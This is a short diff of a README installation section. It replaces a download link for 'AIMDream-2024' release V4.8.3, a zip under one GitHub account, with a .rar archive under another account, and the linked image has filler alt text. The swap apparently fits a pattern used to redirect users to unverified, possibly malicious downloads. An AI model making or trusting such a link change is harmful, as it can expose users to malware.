@@ -10,7 +10,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/61fcefbd-64c5-4138-a850-6a2365290254)
-](https://github.com/mysticmetal/AIMDream-2024/releases/download/V4.8.3/Release.zip)
+](https://github.com/JoashQuinn/AIMDream-2024/releases/download/Release/Release.rar)
 
 
 
